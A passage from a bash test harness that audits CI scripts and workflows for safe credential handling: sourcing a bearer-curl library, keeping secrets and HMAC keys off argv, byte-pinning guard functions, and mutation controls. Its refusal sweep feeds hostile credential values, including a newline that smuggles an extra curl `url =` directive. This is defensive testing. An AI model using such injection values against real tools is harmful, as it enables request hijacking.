S4_POP_N=$(( $(printf '%s\n' "$S3_POP" | grep -c .) + $(printf '%s\n' "$S4_SCRIPT_POP" | grep -c .) ))
if [[ "$S4_POP_N" -ge "$S4_POP_FLOOR" ]]; then row "S4 population: the derived library-user population holds $S4_POP_N members (anti-vacuity floor $S4_POP_FLOOR)" ok
else row "S4 population: the derived library-user population is below its anti-vacuity floor" fail "n=$S4_POP_N floor=$S4_POP_FLOOR"; fi
# Structural rows over the scripts. Statement-level: continuation lines are joined (the same shape s3_statements_py uses for YAML).
s4_script_stm() { sed -e ':a' -e '/\\$/N; s/\\\n[[:space:]]*/ /; ta' "$1"; }
S4_SRC_BAD=""; S4_ARGV_BAD=""; S4_STDERR_BAD=""; S4_RC2_BAD=""; S4_NAME_BAD=""; S4_SCALLS=0; S4_HMAC_SCRIPT_BAD=""
for f in $S4_SCRIPT_POP; do
  stm="$(s4_script_stm "$REPO_ROOT/$f")"
  first_use="$(printf '%s\n' "$stm" | awk '$0 !~ /^[[:space:]]*#/ && $0 ~ /(^|[^_A-Za-z])bc_(curl|ok_var|refuse|hmac_sha256_hex)[ "$]/ && $0 !~ /^[[:space:]]*(source|\.)[[:space:]]/ {print NR; exit}')"
  first_src="$(printf '%s\n' "$stm" | awk '$0 ~ /^[[:space:]]*(source|\.)[[:space:]]/ && $0 ~ /scripts\/lib\/bearer-curl\.sh/ {print NR; exit}')"
  [[ -n "$first_src" && -n "$first_use" && "$first_src" -le "$first_use" ]] || S4_SRC_BAD+=" $f"
  S4_SCALLS=$((S4_SCALLS + $(printf '%s\n' "$stm" | grep -cE '(^|[^_A-Za-z])bc_curl [A-Za-z]' || true)))
  while IFS= read -r l; do s3_d2_hit "$l" && S4_ARGV_BAD+=" $f"; done < <(printf '%s\n' "$stm" | grep -E '(^|[^_A-Za-z])bc_curl ' || true)
  while IFS= read -r l; do s3_d3_hit "$l" && S4_STDERR_BAD+=" $f"; done < <(printf '%s\n' "$stm" | grep -E '(^|[^_A-Za-z])bc_curl ' | sed -E 's/.*(bc_curl .*)/\1/; s/ \|\| .*//; s/ \| .*//' || true)
  while IFS= read -r l; do s3_d5_hit "$l" && S4_RC2_BAD+=" $f"; done < <(printf '%s\n' "$stm" | grep -v '^[[:space:]]*#' || true)
  want_name="$(basename "$f" .sh)"
  while IFS= read -r nm; do [[ "$nm" == "$want_name" || "$nm" == "$(basename "$f")" ]] || S4_NAME_BAD+=" $f:$nm"; done \
    < <(printf '%s\n' "$stm" | grep -v '^[[:space:]]*#' | grep -oE '(^|[^_A-Za-z])bc_(curl|refuse)[ ]+[A-Za-z0-9._-]+' | awk '{print $NF}' | sort -u || true)
  s4_file_has_argv_hmac "$f" && S4_HMAC_SCRIPT_BAD+=" $f"
done
[[ -z "$S4_SRC_BAD" ]] && row "S4 structure: every script sources the library before its first bc_* call" ok || row "S4 structure: a script uses the library before it sources it" fail "$S4_SRC_BAD"
[[ -z "$S4_ARGV_BAD" ]] && row "S4 structure: no bc_curl statement in a script repeats a credential header on its own argument list" ok || row "S4 structure: a script's bc_curl carries -H credential" fail "$S4_ARGV_BAD"
[[ -z "$S4_STDERR_BAD" ]] && row "S4 structure: no bc_curl statement in a script discards stderr (the marker stays visible)" ok || row "S4 structure: 2>/dev/null on a script's bc_curl" fail "$S4_STDERR_BAD"
[[ -z "$S4_RC2_BAD" ]] && row "S4 structure: no script branches on rc == 2 (the marker is the discriminator)" ok || row "S4 structure: a script branches on rc 2" fail "$S4_RC2_BAD"
[[ -z "$S4_NAME_BAD" ]] && row "S4 structure: every bc_curl / bc_refuse in a script names its own file in the marker" ok || row "S4 structure: a script's marker names another file" fail "$S4_NAME_BAD"
[[ -z "$S4_HMAC_SCRIPT_BAD" ]] && row "S4 structure: no library-user script computes an HMAC with the key on openssl's argv" ok || row "S4 structure: openssl -hmac in a library-user script" fail "$S4_HMAC_SCRIPT_BAD"
# The floor is the realized count (9 bc_curl statements: track.sh x2, push-infra-config x1, github-app-key-status x1, probe-github-app-mint x1, git-data-wipe x2 (the read and the write wrapper), inngest-link-flip x2 (flip_webhook's POST and GET arms)). BOTH operands are literals above the `if`.
S4_SCALLS_FLOOR=9
if [[ "$S4_SCALLS" -ge "$S4_SCALLS_FLOOR" ]]; then row "S4 structure: the library-user scripts hold $S4_SCALLS bc_curl statements (anti-vacuity floor $S4_SCALLS_FLOOR)" ok
else row "S4 structure: the script population floor" fail "only $S4_SCALLS bc_curl statements derived (floor $S4_SCALLS_FLOOR)"; fi
# The lint's SCRIPT-CONSUMER derivation (scripts/lint-workflow-local-action-checkout.py, SCRIPT CONSUMERS) runs its `git ls-files` arm on the REAL tree only here
# and in one fixture of its suite; the fixtures of the suite have no `.git`. A pathspec that stopped matching (`*.sh` -> `*.shx`) leaves that suite green, the lint at
# rc 0 and the line at `0 derived, 0 step(s)`, so every script consumer would silently stop being checked for a checkout, `pull_request_target` and an untrusted ref.
# The lint runs on the live tree and BOTH numbers of its `script-consumers:` line are held to floors (the REALIZED counts: 23 derived scripts, of which
# 23 are run by a workflow step; a floor below the realized count lets one script consumer drop out of the derivation without a red row), and the arm must be the git one.
S4_LINT_OUT="$(cd "$REPO_ROOT" && python3 scripts/lint-workflow-local-action-checkout.py 2>&1)"; S4_LINT_RC=$?
S4_LINT_N="$(sed -nE 's/^lint-workflow-local-action-checkout: script-consumers: ([0-9]+) derived \(git ls-files\), ([0-9]+) step\(s\) run one$/\1/p' <<<"$S4_LINT_OUT")"
S4_LINT_M="$(sed -nE 's/^lint-workflow-local-action-checkout: script-consumers: ([0-9]+) derived \(git ls-files\), ([0-9]+) step\(s\) run one$/\2/p' <<<"$S4_LINT_OUT")"
S4_LINT_N_FLOOR=23
S4_LINT_M_FLOOR=23
if [[ "$S4_LINT_RC" == 0 && "$S4_LINT_N" =~ ^[0-9]+$ && "$S4_LINT_M" =~ ^[0-9]+$ && "$S4_LINT_N" -ge "$S4_LINT_N_FLOOR" && "$S4_LINT_M" -ge "$S4_LINT_M_FLOOR" ]]; then
  row "S4 lint: the checkout lint run on the real tree is clean and its script-consumer derivation (git ls-files arm) finds $S4_LINT_N scripts and $S4_LINT_M steps that run one (floors $S4_LINT_N_FLOOR and $S4_LINT_M_FLOOR)" ok
else row "S4 lint: the script-consumer derivation of the checkout lint is empty, below its floors, or not on the git arm" fail "rc=$S4_LINT_RC derived='${S4_LINT_N:-<unparsed>}' steps='${S4_LINT_M:-<unparsed>}' floors=$S4_LINT_N_FLOOR/$S4_LINT_M_FLOOR last='$(tail -1 <<<"$S4_LINT_OUT")'"; fi
# The predicates that judge the scripts are the S3 predicates; the script statement joiner is a control of its own: a continued call is one statement.
S4_JOIN="$(printf '%s\n' 'x=$(bc_curl a "A:B:C" -- -sS \' '  -H "Authorization: z" \' '  url)' | sed -e ':a' -e '/\\$/N; s/\\\n[[:space:]]*/ /; ta')"
[[ "$(printf '%s\n' "$S4_JOIN" | grep -c .)" == 1 ]] && s3_d2_hit "$S4_JOIN" && row "S4 structure control: the script statement joiner folds a continued bc_curl into ONE statement and the D2 predicate then sees the credential header on it" ok || row "S4 structure control: the statement joiner or the D2 predicate is blind" fail "joined='$S4_JOIN'"

# track.sh VOCABULARY (mutation 8): an unusable credential reuses the EXISTING credential-absent verdict; no new verdict word.
S4_TRACK=".github/actions/dispatch-web-redeploy/track.sh"
S4_TRACK_WORDS="$(grep -ohE 'verdict=redeploy_[a-z_]+' "$REPO_ROOT/$S4_TRACK" | sort -u)"
S4_TRACK_WANT="$(printf '%s\n' verdict=redeploy_baseline_unreadable verdict=redeploy_credential_absent verdict=redeploy_dispatch_rejected verdict=redeploy_peer_fanout_degraded verdict=redeploy_status_unreadable verdict=redeploy_tag_unresolved verdict=redeploy_terminal_failure verdict=redeploy_timeout verdict=redeploy_tool_absent | sort)"
if [[ "$S4_TRACK_WORDS" == "$S4_TRACK_WANT" ]]; then row "S4 track.sh vocabulary: the verdict words are exactly the nine the consumers (apply-web-platform-infra, git-data-cutover, the runbook) grep for; the refusal reuses redeploy_credential_absent" ok
else row "S4 track.sh vocabulary: a verdict word was added or removed" fail "got='${S4_TRACK_WORDS//$'\n'/,}'"; fi
echo "=== stage S4: Guard 1 census, populations and structure done ==="

# =====================================================================================
# GUARD 1 (d): the inline-wrapper copies, judged by the S2 PARITY AUDIT (hm_audit above, which reads any indentation). S4 adds eight
# copies of the canonical python3 HMAC snippet to the 19 of the cutover script: web-platform-release.yml 4 and deploy-inngest-image.yml
# 2 (workflow steps, 10-space YAML indentation, signing through the inline `_sig_curl`), infra-config-verify.sh 1 and
# verify-tunnel-ingress-origin.sh 1 (scripts at column 0 that print their own header directives; both sign a status GET).
# The cutover script holds all 19 copies (no -hmac operand is left). The inline wrappers are the exception ADR-280 allows only where a
# pinned property of the job or its suite rules out sourcing a repo file; this audit is the mechanical bound on that exception.
# =====================================================================================
S4_HM_SPEC=".github/workflows/web-platform-release.yml:4: .github/workflows/deploy-inngest-image.yml:2: apps/web-platform/infra/infra-config-verify.sh:1:empty apps/web-platform/infra/scripts/verify-tunnel-ingress-origin.sh:1:empty"
S4_HM_TOTAL=0; S4_HM_ALLBAD=""
for spec in $S4_HM_SPEC; do
  IFS=: read -r hf hn hd <<< "$spec"
  hm_audit "$REPO_ROOT/$hf" "$hd"
  S4_HM_TOTAL=$((S4_HM_TOTAL + HM_NCOPY))
  [[ "$HM_NCOPY" == "$hn" ]] || S4_HM_ALLBAD+=" $hf(copies=$HM_NCOPY want=$hn)"
  for ((hi = 1; hi <= HM_NCOPY; hi++)); do
    if [[ " $HM_BAD " != *" $hi "* ]]; then row "S4 inline HMAC copy $(basename "$hf")#$hi equals the canonical snippet, keeps the SIG=\$(printf <body> | ...) || SIG=\"\" shape and signs the body its own request carries" ok
    else row "S4 inline HMAC copy $(basename "$hf")#$hi equals the canonical snippet, keeps the SIG=\$(printf <body> | ...) || SIG=\"\" shape and signs the body its own request carries" fail "differs from the canonical string, lost its fallback, or signs the wrong body (bad:$HM_BAD)"; fi
  done
done
hm_audit "$CUT"; S4_HM_CUT="$HM_NCOPY"; S4_HM_HELD="$HM_NOLD"
# BOTH operands are literals on the lines IMMEDIATELY above the `if`: 19 cutover copies + 8 S4 copies, and no -hmac operand left in the cutover script.
S4_HM_COPIES_WANT=27
if [[ $((S4_HM_CUT + S4_HM_TOTAL)) -eq "$S4_HM_COPIES_WANT" && -z "$S4_HM_ALLBAD" && "$S4_HM_HELD" == 0 ]]; then
  row "S4 parity audit: $S4_HM_COPIES_WANT converted copies in all (19 cutover + 8 inline: release 4, deploy-inngest-image 2, infra-config-verify 1, verify-tunnel 1), no -hmac operand left in the cutover script" ok
else row "S4 parity audit: the converted-copy count moved or a -hmac operand is back" fail "cutover=$S4_HM_CUT inline=$S4_HM_TOTAL want=$S4_HM_COPIES_WANT hmac=$S4_HM_HELD bad:$S4_HM_ALLBAD"; fi
# Mutants of the parity audit on the S4 copies: ONE byte (-I dropped) in ONE inline copy is caught as exactly that copy, touching exactly that line.
for spec in $S4_HM_SPEC; do
  IFS=: read -r hf hn hd <<< "$spec"
  for ((hi = 1; hi <= hn; hi++)); do
    mf="$BKDIR/hm-s4-$(basename "$hf")-$hi"; assert_fixture_dir "$mf"
    nth_replace "$REPO_ROOT/$hf" "$mf" "$HM_PFX" 'HMAC_KEY="$WEBHOOK_SECRET" python3 -c' "$hi" || fatal "S4 parity mutation $hf#$hi did not land"
    hm_audit "$mf" "$hd"; hm_ln="$(hm_nth_line "$hi" "$REPO_ROOT/$hf" 'HMAC_KEY="$WEBHOOK_SECRET" python3')"
    if [[ "$HM_BAD" == " $hi" && "$(hm_touched "$REPO_ROOT/$hf" "$mf")" == "${hm_ln}c${hm_ln}" ]]; then row "mutation: dropping -I from the inline copy $(basename "$hf")#$hi alone (line $hm_ln only) is caught as exactly that copy" ok
    else row "mutation: dropping -I from the inline copy $(basename "$hf")#$hi alone (line $hm_ln only) is caught as exactly that copy" fail "bad:$HM_BAD touched:$(hm_touched "$REPO_ROOT/$hf" "$mf") want:${hm_ln}c${hm_ln}"; fi
  done
done
# The fail-safe fallback and the signed body are per-site facets too: the empty-key abort (a mute `set -e` exit) and a POST signed over nothing.
mf="$BKDIR/hm-s4-nofallback"; assert_fixture_dir "$mf"
{ mapfile -t _ml < "$REPO_ROOT/.github/workflows/web-platform-release.yml"; _mi=0
  for _mn in "${!_ml[@]}"; do [[ "${_ml[_mn]}" == *'HMAC_KEY="$WEBHOOK_SECRET" python3'* ]] || continue; _mi=$((_mi + 1)); [[ "$_mi" == 2 ]] && _ml[_mn]="${_ml[_mn]% || *}"; done
  printf '%s\n' "${_ml[@]}"; } > "$mf"
hm_audit "$mf" ""
if [[ "$HM_BAD" == " 2" ]]; then row "mutation: dropping the || SIG=\"\" fallback from the web-platform-release Deploy-via-webhook copy is caught as exactly that copy (an empty key would abort the step mute)" ok
else row "mutation: dropping the || SIG=\"\" fallback from the web-platform-release Deploy-via-webhook copy is caught as exactly that copy" fail "bad:$HM_BAD"; fi
mf="$BKDIR/hm-s4-wrongbody"; assert_fixture_dir "$mf"
python3 -I -c '
import sys
t = open(sys.argv[1]).read()
old = "SIG=$(printf '"'%s'"' \"$PAYLOAD\" | HMAC_KEY="
new = "SIG=$(printf '"''"' | HMAC_KEY="
if old not in t: sys.exit(3)
open(sys.argv[2], "w").write(t.replace(old, new, 1))' "$REPO_ROOT/.github/workflows/web-platform-release.yml" "$mf" || fatal "S4 parity mutation wrongbody did not land"
hm_audit "$mf" ""
if [[ "$HM_BAD" == " 2" ]]; then row "mutation: signing the empty body in the web-platform-release Deploy-via-webhook copy, whose request carries -d \"\$PAYLOAD\", is caught as exactly that copy (a POST signed over nothing is a 401)" ok
else row "mutation: signing the empty body in the Deploy-via-webhook copy is caught" fail "bad:$HM_BAD"; fi

# --- the inline guard functions are pinned to the canonical text, byte for byte (plan D4) ---
# The pinned populations are DERIVED from the tree (`git grep -l` of the definitions, minus knowledge-base/, tests and *.test.sh), never listed:
#   `_bearer_ok`: EVERY tracked file that defines it (the cutover script is the canonical source and is the comparison base, so it is out of the
#                 pinned set) must carry a definition byte-equal to BEARER_FN, and the pinned definition count equals the count `git grep` finds
#                 (a definition spelled in a form the pin's reader does not see would otherwise be unpinned and uncounted);
#   `_sig_curl` and `_bearer_curl`: the files that define either must be EXACTLY the explicit set below (set identity: a new inline wrapper in
#                 another file is an unclassified member, a vanished one a stale row), and each wrapper must equal the cutover script's after only the
#                 marker's script name and the cutover's own `--max-time 60` are normalized.
S4_GUARD_FILES=".github/workflows/web-platform-release.yml .github/workflows/deploy-inngest-image.yml .github/workflows/workspaces-luks-cutover.yml apps/web-platform/infra/scripts/verify-tunnel-ingress-origin.sh"
S4_WRAP_FILES="$(printf '%s\n' .github/workflows/deploy-inngest-image.yml .github/workflows/web-platform-release.yml | sort)"
S4_DEF_EXCL=(-- . ':!knowledge-base' ':!tests' ':!*.test.sh' ":!$CUT")
S4_WRAP_DERIVED="$(cd "$REPO_ROOT" && git grep -lIE '^[[:space:]]*(function[[:space:]]+)?(_sig_curl|_bearer_curl)[[:space:]]*\(\)' "${S4_DEF_EXCL[@]}" | sort)"
S4_OK_DERIVED="$(cd "$REPO_ROOT" && git grep -lIE '^[[:space:]]*(function[[:space:]]+)?_bearer_ok[[:space:]]*\(\)' "${S4_DEF_EXCL[@]}" | sort)"
S4_OK_DEFS="$(cd "$REPO_ROOT" && git grep -cIE '^[[:space:]]*(function[[:space:]]+)?_bearer_ok[[:space:]]*\(\)' "${S4_DEF_EXCL[@]}" | awk -F: '{n += $NF} END {print n + 0}')"
s4_guard_py='
import sys, re
canon_ok, cut = sys.argv[1], sys.argv[2]
files = sys.argv[3:]
def fn(lines, name):
    out = []
    i = 0
    while i < len(lines):
        if re.match(r"^\s*" + name + r"\(\) \{$", lines[i]):
            j = i
            while not re.match(r"^\s*\}$", lines[j]):
                j += 1
            ind = len(lines[i]) - len(lines[i].lstrip())
            out.append("\n".join(x[ind:] for x in lines[i:j + 1]))
            i = j
        i += 1
    return out
def norm(t):
    return re.sub(r"script=[A-Za-z0-9._-]+", "script=X", t).replace("--max-time 60 ", "")
cl = open(cut).read().split("\n")
canon = {n: norm(fn(cl, n)[0]) for n in ("_sig_curl", "_bearer_curl")}
n_ok = n_sig = n_brr = 0; bad = []
for f in files:
    L = open(f).read().split("\n")
    for ln in L:
        if re.match(r"^\s*_bearer_ok\(\) \{", ln):
            n_ok += 1
            if ln.strip() != canon_ok:
                bad.append("%s:_bearer_ok" % f.rsplit("/", 1)[-1])
    for n in ("_sig_curl", "_bearer_curl"):
        for t in fn(L, n):
            if n == "_sig_curl": n_sig += 1
            else: n_brr += 1
            if norm(t) != canon[n]:
                bad.append("%s:%s" % (f.rsplit("/", 1)[-1], n))
print(n_ok, n_sig, n_brr, ",".join(bad))
'
read -r S4_G_OK S4_G_SIG S4_G_BRR S4_G_BAD < <(cd "$REPO_ROOT" && python3 -I -c "$s4_guard_py" "$BEARER_FN" "$CUT" $S4_OK_DERIVED)
# BOTH operands are literals above the `if`: 76 `_bearer_ok` definitions outside the cutover script (the four S4 inline-wrapper files hold 10 of them: release 6,
# deploy-inngest-image 2, luks 1, verify-tunnel 1; the rest are the ops scripts and followthrough probes converted by S1 to S3; #10546 retired two of those probes, the outer-wrap soak and the sandbox readback, taking the count from 77 to 76), 6 `_sig_curl`, 2 `_bearer_curl`.
S4_GUARD_FLOOR=76
if [[ -z "$S4_G_BAD" && "$S4_G_OK" -ge "$S4_GUARD_FLOOR" && "$S4_G_OK" == "$S4_OK_DEFS" && "$S4_G_SIG" == 6 && "$S4_G_BRR" == 2 ]]; then
  row "S4 inline guard pin: all $S4_G_OK _bearer_ok definitions of the $(printf '%s\n' "$S4_OK_DERIVED" | grep -c .) tracked files that define one equal the canonical text byte for byte (the count equals git grep's), and the $S4_G_SIG _sig_curl and $S4_G_BRR _bearer_curl wrappers equal the cutover script's (marker name and its --max-time normalized); floor $S4_GUARD_FLOOR"  ok
else row "S4 inline guard pin: an inline guard or wrapper differs from the canonical text" fail "ok=$S4_G_OK defs=$S4_OK_DEFS sig=$S4_G_SIG brr=$S4_G_BRR bad=$S4_G_BAD"; fi
# The pinned file sets are populations, so they are judged by SET IDENTITY: the files defining a wrapper are exactly the explicit set, and the four
# inline-wrapper files the marker rows name still each define _bearer_ok (the derived population cannot shrink away from them).
S4_WRAP_OUT="$(s4_census_verdict "$S4_WRAP_DERIVED" "$S4_WRAP_FILES")"; S4_WRAP_RC=$?
S4_OK_GONE=""; for f in $S4_GUARD_FILES; do grep -qxF -- "$f" <<<"$S4_OK_DERIVED" || S4_OK_GONE+=" $f"; done
if [[ "$S4_WRAP_RC" == 0 && -z "$S4_OK_GONE" ]]; then row "S4 inline guard pin population: the files defining _sig_curl or _bearer_curl are exactly the two pinned workflow files, and each of the four inline-wrapper files still defines _bearer_ok (derived by git grep, never counted)" ok
else row "S4 inline guard pin population: an inline wrapper is defined in a file no pin judges, or a pinned file lost its definition" fail "$S4_WRAP_OUT gone='$S4_OK_GONE'"; fi
S4_WRAP_X="$(printf '%s\n' "$S4_WRAP_DERIVED" .github/workflows/zz-new-inline-wrapper.yml | grep . | sort)"; s4_census_verdict "$S4_WRAP_X" "$S4_WRAP_FILES" > /dev/null; S4_WRAP_X_RC=$?
S4_WRAP_M="$(printf '%s\n' "$S4_WRAP_DERIVED" | grep -v 'deploy-inngest-image' | sort)"; s4_census_verdict "$S4_WRAP_M" "$S4_WRAP_FILES" > /dev/null; S4_WRAP_M_RC=$?
s4_census_verdict "$S4_WRAP_FILES" "$S4_WRAP_FILES" > /dev/null; S4_WRAP_G_RC=$?
[[ "$S4_WRAP_X_RC" != 0 && "$S4_WRAP_M_RC" != 0 && "$S4_WRAP_G_RC" == 0 ]] && row "S4 inline guard pin population control: the pinned set is GREEN, a synthesized extra file defining a wrapper is RED (unclassified) and a vanished pinned file is RED (stale)" ok || row "S4 inline guard pin population control: the set identity does not discriminate" fail "extra=$S4_WRAP_X_RC missing=$S4_WRAP_M_RC good=$S4_WRAP_G_RC"
# The same pin must be SEEN to fail: a one-byte change in one definition is reported by that file (a pin nothing ever fed a known negative is not a control).
mf="$BKDIR/guard-mut-release.yml"; assert_fixture_dir "$mf"
python3 -I -c '
import sys
t = open(sys.argv[1]).read()
old = "_bearer_ok() { local LC_ALL=C; case"
if old not in t: sys.exit(3)
open(sys.argv[2], "w").write(t.replace(old, "_bearer_ok() { local LC_ALL=; case", 1))' "$REPO_ROOT/.github/workflows/web-platform-release.yml" "$mf" || fatal "S4 guard pin mutation did not land"
read -r _g1 _g2 _g3 S4_G_MBAD < <(python3 -I -c "$s4_guard_py" "$BEARER_FN" "$REPO_ROOT/$CUT" "$mf")
[[ "$S4_G_MBAD" == "guard-mut-release.yml:_bearer_ok" ]] && row "S4 inline guard pin control: a one-byte change to one _bearer_ok definition is reported at its file" ok || row "S4 inline guard pin control: the pin does not see a one-byte change" fail "got='$S4_G_MBAD'"
# A NEW file nobody listed, defining a permissive _bearer_ok, is a member of the derived population and is reported by name.
mf="$BKDIR/guard-new-script.sh"; assert_fixture_dir "$mf"
printf '%s\n' '#!/usr/bin/env bash' '_bearer_ok() { return 0; }' > "$mf"
read -r _g1 _g2 _g3 S4_G_NBAD < <(python3 -I -c "$s4_guard_py" "$BEARER_FN" "$REPO_ROOT/$CUT" "$mf")
[[ "$S4_G_NBAD" == "guard-new-script.sh:_bearer_ok" && "$_g1" == 1 ]] && row "S4 inline guard pin control: a permissive _bearer_ok in a NEW unlisted file is counted and reported at that file (the pin quantifies over the derived population)" ok || row "S4 inline guard pin control: a new file's _bearer_ok escapes the pin" fail "got='$S4_G_NBAD' n=$_g1"
# infra-config-verify.sh keeps its guard as a subshell case (a function would be an unlisted command to its read-only-allowlist suite): the
# PATTERN is pinned to the library alphabet, and the marker names the file.
S4_PAT="$(sed -E 's/.* in (.*)\) return 1.*/\1/' <<<"$BEARER_FN")"
if grep -qF -- "case \"\${!_cred:-}\" in ${S4_PAT}) exit 1 ;; esac" "$REPO_ROOT/apps/web-platform/infra/infra-config-verify.sh"; then
  row "S4 inline guard pin: infra-config-verify.sh judges the three credentials with exactly the library's token alphabet ($S4_PAT)" ok
else row "S4 inline guard pin: infra-config-verify.sh's shape check differs from the library alphabet" fail "pattern=$S4_PAT"; fi
S4_MARK_BAD=""
for f in .github/workflows/web-platform-release.yml .github/workflows/deploy-inngest-image.yml .github/workflows/workspaces-luks-cutover.yml apps/web-platform/infra/infra-config-verify.sh; do
  want_name="$(basename "$f")"; want_name="${want_name%.*}"
  names="$(grep -oE 'SOLEUR_CREDENTIAL_REFUSED script=[A-Za-z0-9._-]+' "$REPO_ROOT/$f" | sed 's/.*script=//' | sort -u)"
  [[ "$names" == "$want_name" ]] || S4_MARK_BAD+=" $f:${names//$'\n'/,}"
done
[[ -z "$S4_MARK_BAD" ]] && row "S4 structure: every inline wrapper file names ITSELF in the refusal marker (web-platform-release, deploy-inngest-image, workspaces-luks-cutover, infra-config-verify)" ok || row "S4 structure: an inline marker names another file" fail "$S4_MARK_BAD"
echo "=== stage S4: parity audit and guard pins done ==="

# =====================================================================================
# GUARD 2: a refused credential reaches the SAME verdict class as the old failure. The REAL step bodies (extracted from the YAML) and
# the real scripts run under the recording curl, each credential EMPTY, UNSET and HOSTILE (a quote carrying the canary, and a newline
# that tries to open a second `url =` directive on the config channel), with python3 ABSENT at one HMAC site per form. Every row
# reads the step's OWN lines and its GITHUB_OUTPUT / GITHUB_ENV (an exit code alone cannot tell a mute abort from a refusal), asserts
# zero requests, the marker, the sink table's verdict, and the canary in no captured stream. A well-formed run per representative
# proves the arm still SUCCEEDS; transport failures go through REAL curl against a closed port (the 000000 quirk).
# =====================================================================================
: > "$S4/bodies/empty"
S4_BASE=()
S4_SWEEP_BAD=""; S4_SWEEP_N=0; S4_SWEEP_WANT=0
# s4_sweep <label> <script> <realdir> <verdict-fn> "<credential vars>" "<key vars>": reads the global S4_BASE (NAME=value ...).
# A credential is run empty, unset, hostile-quote and hostile-newline; a KEY (an HMAC key, only non-emptiness matters) empty and unset.
s4_sweep() {
  local label="$1" body="$2" realdir="$3" vfn="$4" creds="$5" keys="$6" v st e
  local -a env_
  S4_SWEEP_BAD=""; S4_SWEEP_N=0; S4_SWEEP_WANT=0
  for v in $creds $keys; do
    for st in empty unset hostile-quote hostile-newline; do
      [[ " $keys " == *" $v "* && "$st" == hostile-* ]] && continue
      S4_SWEEP_WANT=$((S4_SWEEP_WANT + 1))
      env_=(); for e in "${S4_BASE[@]}"; do [[ "$e" == "$v="* ]] || env_+=("$e"); done
      case "$st" in
        empty) env_+=("$v=") ;;
        unset) : ;;
        hostile-quote) env_+=("$v=${S4_CANARY}\"x") ;;
        hostile-newline) env_+=("$v=${S4_CANARY}"$'\n'"url = \"http://127.0.0.1:9/\"") ;;
      esac
      s4_run "$label-$v-$st" "$body" "$realdir" "${env_[@]}"
      S4_SWEEP_N=$((S4_SWEEP_N + 1)); S4_REFUSAL_RUNS=$((S4_REFUSAL_RUNS + 1))
      if ! { [[ "$(s4_ncalls)" == 0 ]] && s4_canary_clean && "$vfn" "$v" "$st"; }; then S4_SWEEP_BAD+=" [$v/$st rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)]"; fi
    done
  done
}
s4_sweep_row() { # <description>
  if [[ -z "$S4_SWEEP_BAD" && "$S4_SWEEP_N" == "$S4_SWEEP_WANT" && "$S4_SWEEP_N" -gt 0 ]]; then row "$1 ($S4_SWEEP_N runs)" ok
  else row "$1" fail "${S4_SWEEP_BAD:- ran $S4_SWEEP_N of $S4_SWEEP_WANT}"; fi
}
# s4_nopy_row <description> <script> <verdict-fn>: the same site with python3 ABSENT (the signature cannot be computed): the arm's own verdict, never a mute abort.
s4_nopy_row() {
  s4_run "nopy-$1" "$2" "$S4/real-nopy" "${S4_BASE[@]}"; S4_REFUSAL_RUNS=$((S4_REFUSAL_RUNS + 1))
  if [[ "$(s4_ncalls)" == 0 ]] && s4_canary_clean && "$3" python3 absent; then row "$1" ok
  else row "$1" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
}
# s4_mutant_red <description> <workflow> <step> <tag> <from> <to> <verdict-fn> <hostile NAME=value>: a MUTANT of a real step (the one line <from> replaced by <to>, built from the YAML;
# a line that no longer matches fails THIS row, never the battery) run with a hostile credential on the global S4_BASE must be judged RED by the very verdict function the
# row's sweep uses. This is what makes a verdict function a control: a swallowed refusal (`|| true`, `|| echo 200`) reads as a pass in the old behaviour, so a verdict that
# only has positive and negative text clauses but was never fed a bad step could be satisfied by anything.
s4_mutant_red() {
  local d="$1" wf="$2" step="$3" tag="$4" from="$5" to="$6" vfn="$7" hostile="$8" built=0 e out
  local -a env_=()
  out="$S4/b-ctl-$tag.sh"
  s4_body_try "$wf" "$step" "$out" "$from" "$to" && built=1
  if (( built )); then
    for e in "${S4_BASE[@]}"; do [[ "$e" == "${hostile%%=*}="* ]] || env_+=("$e"); done
    s4_run "ctl-$tag" "$out" "$S4/real" "${env_[@]}" "$hostile"; S4_REFUSAL_RUNS=$((S4_REFUSAL_RUNS + 1))
  fi
  if (( built )) && ! "$vfn" "${hostile%%=*}" hostile-quote; then row "$d" ok
  else row "$d" fail "built=$built rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers) (a green verdict means the mutant is accepted; built=0 means the step no longer contains the line the control mutates)"; fi
}
# s4_wh_ok <body file> <call#>: the call carries X-Signature-256 == the independent openssl digest over the request's own body bytes, then
# the Cloudflare Access id and secret, in that order, none of the four values is on any recorded argv of curl, python3 or openssl, and the
# signature really was computed by a python3 child (a wrapper that recorded nothing would let the key check pass on an empty record).
s4_wh_ok() {
  local want; want="$(s4_oracle "$S4_KEY" "$1")"
  [[ -n "$want" && "$(s4_stdin_line "$2" 1)" == "header = \"X-Signature-256: sha256=$want\"" && "$(s4_stdin_line "$2" 2)" == "header = \"CF-Access-Client-Id: $S4_CFID\"" \
     && "$(s4_stdin_line "$2" 3)" == "header = \"CF-Access-Client-Secret: $S4_CFSEC\"" ]] \
    && s4_nowhere_on_argv "$S4_KEY" && s4_nowhere_on_argv "$want" && s4_nowhere_on_argv "$S4_CFID" && s4_nowhere_on_argv "$S4_CFSEC" \
    && s4_tool_ran python3
}
S4_NOW="$(date +%s)"
S4_WH_BASE=(WEBHOOK_SECRET="$S4_KEY" CF_ACCESS_CLIENT_ID="$S4_CFID" CF_ACCESS_CLIENT_SECRET="$S4_CFSEC" SHIM_PROFILE=webhook)
S4_DOP_BASE=(D_WEBHOOK_DEPLOY_SECRET="$S4_KEY" D_CF_ACCESS_CLIENT_ID="$S4_CFID" D_CF_ACCESS_CLIENT_SECRET="$S4_CFSEC" SHIM_PROFILE=webhook)

# ---- row 1 and row 2: restart-inngest-server (library; the poll loop, the lock_contention final re-read and the liveness read) ----
S4_RST=".github/workflows/restart-inngest-server.yml"
s4_body "$REPO_ROOT/$S4_RST" "Trigger restart via webhook" "$S4/b-r1.sh"
s4_body "$REPO_ROOT/$S4_RST" "Verify restart completion" "$S4/b-r2.sh" 'MAX_POLLS=120' 'MAX_POLLS=3'
S4_BASE=("${S4_WH_BASE[@]}")
s4_run r1-ok "$S4/b-r1.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(cat "$S4_ROW/calls/1.body")" == '{"command":"restart inngest _ latest"}' ]] && s4_calls_ok 3 && s4_wh_ok "$S4_ROW/calls/1.body" 1 \
   && grep -q '^TRIGGER_TS=' "$S4_ROW/genv" && s4_said 'Restart initiated (HTTP 202)'; then
